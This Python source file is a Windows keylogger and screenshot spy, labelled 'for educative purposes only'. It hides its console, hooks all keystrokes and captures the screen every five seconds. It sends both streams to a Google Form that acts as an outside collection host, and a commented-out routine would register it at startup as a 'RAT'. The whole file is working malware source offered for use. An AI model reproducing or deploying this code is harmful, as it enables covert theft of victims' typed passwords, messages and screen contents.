# This application is for educative purposes only.
import Queue
import io
import threading
import time

from PIL import Image

try:
    import pyHook
    import pythoncom
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import base64
import requests
import win32event, win32api, winerror
from PIL import ImageGrab

# Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)

data = ''
key_strokes_queue = Queue.Queue()
screenshot_queue = Queue.Queue()

BUFFER_SIZE = 1000

# Hide Console
def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)


# Add to startup
# def addStartup():
#     fp = os.path.dirname(os.path.realpath(__file__))
#     file_name = sys.argv[0].split("\\")[-1]
#     new_file_path = fp + "\\" + file_name
#     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
#
#     key2change = OpenKey(HKEY_CURRENT_USER,
#                          keyVal, 0, KEY_ALL_ACCESS)
#
#     SetValueEx(key2change, "RAT", 0, REG_SZ, new_file_path)


def remote_send():
    global key_strokes_queue
    if key_strokes_queue.empty():
        return

    data_to_be_sent = key_strokes_queue.get()

    url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
    form_data = {'entry.1256060651': data_to_be_sent}
    user_agent = {
        'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
        'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"
    }
    requests.post(url, data=form_data, headers=user_agent, verify="cert.pem")
    # https://support.globalsign.com/customer/en/portal/articles/1464693-maximum-certificate-validity


# Remote Google Form logs post
# Buffer size ~1000 char
def send_key_logs():
    global data
    if len(data) > BUFFER_SIZE:
        print data
        key_strokes_queue.put(data)
        data = ''
        t = threading.Thread(target=remote_send)
        t.daemon = True
        t.start()
    return True


def remote_send_screenshot():
    screenshot_to_be_sent = screenshot_queue.get()
    print len(screenshot_to_be_sent), screenshot_to_be_sent

    url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
    form_data = {'entry.1529555865': screenshot_to_be_sent[:5000]}
    user_agent = {
        'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
        'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"}
    requests.post(url, data=form_data, headers=user_agent)

    # x = "qwertyui"
    # chunks, chunk_size = len(x), len(x) // 4
    # [x[i:i + chunk_size] for i in range(0, chunks, chunk_size)]
    # ['qw', 'er', 'ty', 'ui']
    # plt.imshow(img, cmap='gray', interpolation='bicubic')
    # plt.show()


# data:image/png;base64,
def take_screenshot(img_width=500):
    while True:
        buffer = io.BytesIO()

        img = ImageGrab.grab()
        img.thumbnail((img_width, img.size[1] * img_width / img.size[0]), Image.ANTIALIAS)
        img.save(buffer, "JPEG")
        img.close()
        img_base64 = base64.b64encode(buffer.getvalue())

        screenshot_queue.put(img_base64)

        t = threading.Thread(target=remote_send_screenshot)
        t.daemon = True
        t.start()

        time.sleep(5)


def OnKeyboardEvent(event):
    if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
        data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt)
        print data  # debugging


def keypressed(event):
    global data
    data += "[%s]" % event.Key
    send_key_logs()


def run_keylogger_handler():
    hookManager= pyHook.HookManager()
    hookManager.KeyDown = keypressed
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()


def run_screenshot_handler():
    t = threading.Thread(target=take_screenshot, args=[1000])
    t.daemon = True
    t.start()


def main():
    hide()
    run_screenshot_handler()
    run_keylogger_handler()


if __name__ == '__main__':
    main()
